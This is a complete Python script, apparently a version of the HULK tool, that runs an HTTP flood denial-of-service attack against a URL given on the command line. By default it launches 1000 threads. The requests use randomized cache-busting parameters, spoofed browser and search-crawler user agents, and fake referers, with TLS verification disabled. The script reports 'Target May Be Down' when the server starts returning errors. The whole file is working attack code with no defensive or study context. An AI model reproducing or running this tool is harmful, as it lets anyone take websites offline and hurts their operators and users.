import urllib.request
import sys
import threading
import random
import re
import socket
import ssl
import time
import gzip
import zlib
from io import BytesIO

url = ''
host = ''
headers_useragents = []
headers_referers = []
request_counter = 0
flag = 0
safe = 0
ssl_verify = False
socket.setdefaulttimeout(5)

def inc_counter():
    global request_counter
    request_counter += 1

def set_flag(val):
    global flag
    flag = val

def set_safe():
    global safe
    safe = 1

def useragent_list():
    global headers_useragents
    headers_useragents.extend([
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
        'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59',
        'Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0'
    ])
    return headers_useragents

def referer_list():
    global headers_referers
    headers_referers.extend([
        f'http://www.google.com/search?q={buildblock(10)}',
        f'http://www.bing.com/search?q={buildblock(10)}',
        f'http://search.yahoo.com/search?p={buildblock(10)}',
        f'http://www.ask.com/web?q={buildblock(10)}',
        f'http://{host}/'
    ])
    return headers_referers

def buildblock(size):
    return ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', k=size))

def httpcall(target_url):
    global flag, safe
    useragent_list()
    referer_list()
    
    param_joiner = '&' if '?' in target_url else '?'
    random_params = f'{buildblock(random.randint(3,10))}={buildblock(random.randint(3,10))}'
    full_url = f"{target_url}{param_joiner}{random_params}"
    
    req = urllib.request.Request(
        full_url,
        headers={
            'User-Agent': random.choice(headers_useragents),
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'Expires': '0',
            'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
            'Referer': random.choice(headers_referers),
            'Keep-Alive': str(random.randint(110, 120)),
            'Connection': 'keep-alive',
            'Host': host,
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
        }
    )
    
    try:
        context = ssl._create_unverified_context() if not ssl_verify else None
        with urllib.request.urlopen(req, context=context) as response:
            data = response.read()
            if response.headers.get('Content-Encoding') == 'gzip':
                data = gzip.decompress(data)
            elif response.headers.get('Content-Encoding') == 'deflate':
                data = zlib.decompress(data)
            inc_counter()
            return response.status
    except urllib.error.HTTPError as e:
        if e.code == 500 and safe:
            set_flag(2)
        return e.code
    except Exception:
        return 0

class HTTPThread(threading.Thread):
    def run(self):
        try:
            while flag < 2:
                httpcall(url)
                time.sleep(random.uniform(0.01, 0.1))
        except:
            pass

class MonitorThread(threading.Thread):
    def run(self):
        previous = request_counter
        while flag == 0:
            if previous + 100 < request_counter and previous != request_counter:
                print(f"{request_counter} Requests Sent - {threading.active_count()} Threads Active")
                previous = request_counter
            time.sleep(1)
        if flag == 2:
            print("\nAttack Finished - Target May Be Down")

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print('Usage: python3 hulk.py <url> [safe] [threads]')
        sys.exit()
    
    url = sys.argv[1]
    if url.count('/') == 2:
        url += '/'
    
    m = re.match(r'(https?://)?([^/]+)/?.*', url)
    host = m.group(2)
    
    if len(sys.argv) > 2:
        if 'safe' in sys.argv:
            set_safe()
    
    threads = 1000
    if len(sys.argv) > 3:
        try:
            threads = int(sys.argv[3])
        except:
            pass
    
    print(f"Attack Started - Target: {host}")
    
    for _ in range(threads):
        t = HTTPThread()
        t.daemon = True
        t.start()
    
    t = MonitorThread()
    t.daemon = True
    t.start()
    
    try:
        while t.is_alive():
            time.sleep(1)
    except KeyboardInterrupt:
        set_flag(2)
        sys.exit(0)